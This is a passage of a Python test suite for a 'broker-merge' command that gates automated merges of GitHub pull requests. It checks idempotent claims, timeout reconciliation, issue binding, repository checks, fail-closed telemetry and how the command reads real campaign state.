        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc in (BROKER_REFUSED_RC, BROKER_PARKED_RC)
        assert out["status"] != "merged"

    def test_an_ambiguous_timeout_that_actually_merged_resolves(self, tmp_path, capsys):
        """The reason claims exist: GitHub's merge API takes no idempotency key."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(merge_raises=subprocess.TimeoutExpired("gh", 180))
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == 0
        assert out["status"] == "merged"
        assert out["merge_sha"] == "d5f1683e"
        assert runner.merge_calls == 1                 # reconciled, never re-merged

    def test_an_ambiguous_outcome_with_an_unreadable_probe_parks(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(merge_raises=subprocess.TimeoutExpired("gh", 180),
                              pr_state="{not json")
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_PARKED_RC
        assert out["status"] == "parked"
        assert out["claim_id"]

    def test_a_definitive_refusal_leaves_the_pr_open_and_refuses(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(merge_rc=1, pr_state=_OPEN_JSON)
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert out["status"] == "refused"

    def test_a_rerun_after_a_completed_merge_is_terminal_and_never_merges_twice(
            self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        first = BrokerRunner()
        assert _broker(root, runner=first, capsys=capsys)[0] == 0
        second = BrokerRunner()
        rc, out = _broker(root, runner=second, capsys=capsys)
        assert rc == 0
        assert out["merge_sha"] == "d5f1683e"
        assert second.merge_calls == 0

    def test_a_rerun_after_a_park_reconciles_instead_of_re_merging(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        parked = BrokerRunner(merge_raises=subprocess.TimeoutExpired("gh", 180),
                              pr_state="{not json")
        assert _broker(root, runner=parked, capsys=capsys)[0] == BROKER_PARKED_RC
        resumed = BrokerRunner()                       # probe now answers MERGED
        rc, out = _broker(root, runner=resumed, capsys=capsys)
        assert rc == 0
        assert out["status"] == "merged"
        assert resumed.merge_calls == 0


class TestBrokerMergeContractHoldsUnderRaces:
    """Self-review (Step 11, bug/logic lens): every HANDLER exit owes a JSON line.

    `reconcile_claim` raises `ClaimError` when the claim is no longer `executing` — a
    concurrent process finishing the same claim is exactly the race claims exist for.
    `ClaimError` is not a `LauncherError`, so before the fix it escaped `main`'s handler
    as a traceback: rc 1, no JSON, and a caller branching on the documented contract
    silently mis-reads a security gate's outcome.
    """

    def test_a_claim_error_during_reconcile_still_returns_the_contract(
            self, tmp_path, capsys, monkeypatch):
        """Drive the seam directly: `reconcile_claim` raising is the race, and a
        `ClaimError` is not a `LauncherError`, so before the fix it escaped `main` as a
        traceback — rc 1, no JSON line, and a caller branching on the documented
        contract silently mis-reads a security gate's outcome."""
        root = _broker_workspace(tmp_path)
        import supervision_claims as sc_mod

        def _boom(**_kw):
            raise sc_mod.ClaimError("claim is 'executed', not 'executing'")
        monkeypatch.setattr(sc_mod, "reconcile_claim", _boom)

        runner = BrokerRunner(merge_raises=subprocess.TimeoutExpired("gh", 180))
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert out is not None, "handler exited without its JSON contract line"
        assert rc == BROKER_PARKED_RC
        assert out["status"] == "parked"
        assert out["claim_id"]


class TestBrokerMergeStep11Findings:
    """Step 11 cross-model review — every finding, as a test that fails without its fix."""

    def test_a_quoted_reference_does_not_bind(self, tmp_path, capsys):
        """F6: the prefix class explicitly permitted `>`, so a quoted line in an
        unrelated PR passed target binding. The earlier test gave false confidence by
        putting text between the quote marker and the phrase."""
        root = _broker_workspace(tmp_path)
        for body in ("> Part of #963", "> Closes #963", ">> Part of #963"):
            runner = BrokerRunner(binding=json.dumps({
                "closingIssuesReferences": [], "body": body, "title": "unrelated"}))
            rc, _out = _broker(root, runner=runner, capsys=capsys)
            assert rc == BROKER_REFUSED_RC, body
            assert runner.merge_calls == 0, body

    def test_an_explicit_repo_is_refused_when_no_canonical_repo_is_configured(
            self, tmp_path, capsys):
        """F4: with `.rawgentic.json` missing or malformed the equality check was
        skipped entirely, so `--repo` could point anywhere the ambient gh token reaches."""
        root = _broker_workspace(tmp_path)
        Path(root, ".rawgentic.json").write_text("{not json", encoding="utf-8")
        runner = BrokerRunner()
        rc, out = _broker_with_repo(root, runner=runner, repo="someone/else",
                                    capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert runner.merge_calls == 0
        assert "repo" in out["reason"]

    def test_a_closing_reference_in_another_repository_does_not_bind(self, tmp_path,
                                                                    capsys):
        """F5: only the issue NUMBER was compared, so a cross-repo closing reference to
        someone else's issue 963 satisfied this campaign's binding."""
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(binding=json.dumps({
            "closingIssuesReferences": [
                {"number": 963,
                 "repository": {"name": "other", "owner": {"login": "someone"}}}],
            "body": "no linkage here", "title": "unrelated"}))
        rc, _out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert runner.merge_calls == 0

    def test_a_matching_repository_closing_reference_still_binds(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        runner = BrokerRunner(binding=json.dumps({
            "closingIssuesReferences": [
                {"number": 963,
                 "repository": {"name": "r", "owner": {"login": "o"}}}],
            "body": "", "title": ""}))
        rc, _out = _broker(root, runner=runner, capsys=capsys)
        assert rc == 0

    def test_a_reconcile_that_cannot_reconfirm_the_sha_parks(self, tmp_path, capsys):
        """F1: the resolved branch re-probed and returned rc 0 regardless, so the broker
        could report a probe-confirmed merge with merge_sha null."""
        root = _broker_workspace(tmp_path)

        class Flaky(BrokerRunner):
            def __init__(self):
                super().__init__(merge_raises=subprocess.TimeoutExpired("gh", 180))
                self.state_calls = 0

            def __call__(self, argv, timeout=180):
                joined = " ".join(argv)
                if "mergeCommit" in joined:
                    self.state_calls += 1
                    # First probe (inside reconcile) says MERGED; the confirmation
                    # probe then fails — a transient GitHub error.
                    self.pr_state = _MERGED_JSON if self.state_calls == 1 else "{not json"
                return super().__call__(argv, timeout)

        rc, out = _broker(root, runner=Flaky(), capsys=capsys)
        assert not (rc == 0 and out.get("merge_sha") is None), \
            "reported merged with no confirmed SHA"

    def test_a_failing_mark_executed_still_returns_the_contract(self, tmp_path, capsys,
                                                               monkeypatch):
        """F2: after an IRREVERSIBLE merge, an unguarded mark_executed raised past the
        JSON contract — a traceback exactly where the caller most needs a verdict."""
        root = _broker_workspace(tmp_path)
        import supervision_claims as sc_mod
        monkeypatch.setattr(sc_mod, "mark_executed",
                            lambda **_kw: (_ for _ in ()).throw(OSError("disk full")))
        rc, out = _broker(root, runner=BrokerRunner(), capsys=capsys)
        assert out is not None, "handler exited without its JSON contract line"
        assert rc == BROKER_PARKED_RC
        assert out["merge_sha"] == "d5f1683e"      # the merge DID happen; say so

    def test_a_driver_state_edit_does_not_change_the_claim_identity(self, tmp_path,
                                                                   capsys):
        """F3: the driver-state digest rode in action_params, which IS the identity, so
        any campaign-state edit made a re-run mint a foreign claim instead of resuming —
        breaking the re-run guarantee the whole transition table rests on."""
        root = _broker_workspace(tmp_path)
        first = BrokerRunner(merge_raises=subprocess.TimeoutExpired("gh", 180),
                             pr_state="{not json")
        assert _broker(root, runner=first, capsys=capsys)[0] == BROKER_PARKED_RC

        path = Path(root, "claude_docs", ".driver-state", "epic-963.json")
        state = json.loads(path.read_text())
        state["issues"][0]["status"] = "pr_open"            # an ordinary driver write
        path.write_text(json.dumps(state))

        resumed = BrokerRunner()
        rc, _out = _broker(root, runner=resumed, capsys=capsys)
        assert rc == 0
        assert resumed.merge_calls == 0, "re-ran the merge instead of resuming the claim"

    def test_an_ambiguous_confirmed_open_retries_exactly_once(self, tmp_path, capsys):
        """F7: the contract promises ONE internal retry on a confirmed-open ambiguous
        outcome; the implementation returned rc 12 without ever retrying."""
        root = _broker_workspace(tmp_path)

        class OpenThenMerged(BrokerRunner):
            def __init__(self):
                super().__init__()
                self.state_calls = 0
                self.first = True

            def __call__(self, argv, timeout=180):
                joined = " ".join(argv)
                if "pr merge" in joined and self.first:
                    self.first = False
                    self.merge_calls += 1
                    raise subprocess.TimeoutExpired("gh", 180)
                if "mergeCommit" in joined:
                    self.state_calls += 1
                    self.pr_state = _OPEN_JSON if self.state_calls == 1 else _MERGED_JSON
                return super().__call__(argv, timeout)

        runner = OpenThenMerged()
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == 0, out
        assert runner.merge_calls == 2, "expected exactly one internal retry"


class TestBrokerMergeTelemetry:

    def _events(self, root):
        return _stel.read_events(root)

    def test_a_clean_merge_records_the_whole_sequence(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path)
        _broker(root, runner=BrokerRunner(), capsys=capsys)
        events = self._events(root)
        assert [e["transition"] for e in events if e["kind"] == "claim"] == \
            ["minted", "executing", "executed"]
        authority = [e for e in events if e["kind"] == "authority"]
        assert authority[0]["action"] == "merge"
        assert authority[0]["decision"] == "permitted"
        assert authority[0]["pr"] == 970
        assert authority[0]["issue"] == 963

    def test_a_denial_records_its_reason_and_nothing_else(self, tmp_path, capsys):
        root = _broker_workspace(tmp_path, declared="away")
        _broker(root, runner=BrokerRunner(), capsys=capsys)
        events = self._events(root)
        assert [e for e in events if e["kind"] == "claim"] == []
        assert events[-1]["decision"] == "denied"
        assert events[-1]["reason"]

    def test_an_unrecordable_decision_aborts_before_any_merge(self, tmp_path, capsys):
        """Fail-CLOSED before the side effect: an unmeasurable outward action is the
        exact failure this store exists to prevent."""
        root = _broker_workspace(tmp_path)
        Path(_stel.telemetry_path(root)).mkdir(parents=True)
        runner = BrokerRunner()
        rc, out = _broker(root, runner=runner, capsys=capsys)
        assert rc == BROKER_REFUSED_RC
        assert runner.merge_calls == 0
        assert "telemetry" in out["reason"]


class TestBrokerMergeMarkerSelfHeal:

    def test_a_valid_record_with_no_marker_is_migrated_before_evaluating(
            self, tmp_path, capsys):
        """So a workspace that declared before #963 shipped cannot sit unprotected
        waiting for an unrelated admin write."""
        root = _broker_workspace(tmp_path, merge_policy="auto-merge-scoped-to-run",
                                 declared="away")
        os.unlink(_sl.declared_marker_path(root))
        _broker(root, runner=BrokerRunner(), capsys=capsys)
        marker, status = _sl.read_marker(root)
        assert status == "valid"
        assert marker["declared"] is True


class TestBrokerMergeCLI:

    def test_help_exits_zero(self):
        r = subprocess.run([sys.executable, str(HOOKS / "launcher_lib.py"),
                            "broker-merge", "--help"],
                           capture_output=True, text=True, check=False)
        assert r.returncode == 0
        assert "broker" in r.stdout.lower()

    def test_a_missing_required_argument_is_a_usage_error(self):
        r = subprocess.run([sys.executable, str(HOOKS / "launcher_lib.py"),
                            "broker-merge", "--pr", "1"],
                           capture_output=True, text=True, check=False)
        assert r.returncode == 2


class TestBrokerCampaignBindingReadsRealDriverState:
    """#976 T0 — the broker refused every real campaign, and its fixture hid it.

    `broker_campaign_names_issue` read `state["children"][].issue`. `driver_lib` writes
    and reads top-level `issues[].number`; its only `children` key is the unrelated
    `queue_revalidation.children` dict. So target binding failed for every real campaign
    with rc 12 while the suite stayed green against an invented fixture.
    """

    #: One real record, copied field-for-field from
    #: claude_docs/.driver-state/epic-875-stay-small.json.
    REAL = {
        "schema_version": 2,
        "campaign": "epic-875-stay-small",
        "project": "rawgentic",
        "epic": 875,
        "epic_status": "open",
        "issues": [
            {"number": 856, "status": "merged", "pr": 877, "depends_on": [],
             "merge_sha": "33f31b5d65032121e750953e6b46f38421d6d921"},
            {"number": 880, "status": "pr_open", "pr": 887, "depends_on": []},
        ],
    }

    def test_a_real_campaign_names_its_children(self):
        assert ll.broker_campaign_names_issue(self.REAL, 880) is True
        assert ll.broker_campaign_names_issue(self.REAL, 856) is True

    def test_a_real_campaign_does_not_name_a_foreign_issue(self):
        assert ll.broker_campaign_names_issue(self.REAL, 999) is False

    def test_the_legacy_children_shape_is_still_accepted(self):
        """Kept working so no hand-written fixture elsewhere silently flips meaning."""
        legacy = {"campaign": "c", "children": [{"issue": 963, "status": "in_progress"}]}
        assert ll.broker_campaign_names_issue(legacy, 963) is True
        assert ll.broker_campaign_names_issue(legacy, 964) is False

    def test_a_bare_int_entry_is_still_accepted(self):
        assert ll.broker_campaign_names_issue({"issues": [880]}, 880) is True
        assert ll.broker_campaign_names_issue({"children": [880]}, 880) is True

    def test_junk_is_refused_rather_than_raising(self):
        assert ll.broker_campaign_names_issue(None, 1) is False
        assert ll.broker_campaign_names_issue({}, 1) is False
        assert ll.broker_campaign_names_issue({"issues": "nope"}, 1) is False
        assert ll.broker_campaign_names_issue({"issues": [None, "x", 3.5]}, 1) is False

    def test_the_production_writer_and_the_broker_agree_on_the_schema(self):
        """The bug was a fixture that lied, so assert BEHAVIOR, not a source substring.

        Step 11 finding: an earlier version of this test only checked that the string
        `state.get("issues", [])` appeared somewhere in driver_lib.py, which proves
        nothing about what the writer emits. This drives a real production writer and
        feeds its output straight to the broker's reader, so a future schema change
        breaks it for the right reason.
        """
        sys.path.insert(0, str(HOOKS))
        import driver_lib  # noqa: PLC0415

        state = {"schema_version": 2, "campaign": "epic-test", "project": "p",
                 "issues": [{"number": 880, "status": "queued", "pr": 887},
                            {"number": 881, "status": "queued", "pr": 888}]}

        # The writer the epic driver actually uses when a child ships.
        updated = driver_lib.record_child_outcome(state, 880, "merged")
        assert updated is not None
        assert updated["issues"][0]["status"] == "merged"

        # The broker's reader must find both children in the writer's own output.
        assert ll.broker_campaign_names_issue(updated, 880) is True
        assert ll.broker_campaign_names_issue(updated, 881) is True
        assert ll.broker_campaign_names_issue(updated, 999) is False

    def test_the_fixture_writes_state_the_validator_accepts(self, tmp_path):
        """And the fixture's own shape must survive driver_lib's validator."""
        sys.path.insert(0, str(HOOKS))
        import driver_lib  # noqa: PLC0415

        root = _broker_workspace(tmp_path, campaign="c", issue=880, pr_number=887)
        written = json.loads(
            Path(root, "claude_docs", ".driver-state", "c.json").read_text())
        assert "issues" in written and "children" not in written
        assert written["issues"][0]["number"] == 880
        assert written["issues"][0]["pr"] == 887
        assert ll.broker_campaign_names_issue(written, 880) is True

        # record_child_outcome runs `_numbers()`, which fails closed on a missing or
        # non-int number -- so accepting this fixture proves its entries are well formed.
        assert driver_lib.record_child_outcome(written, 880, "merged") is not None
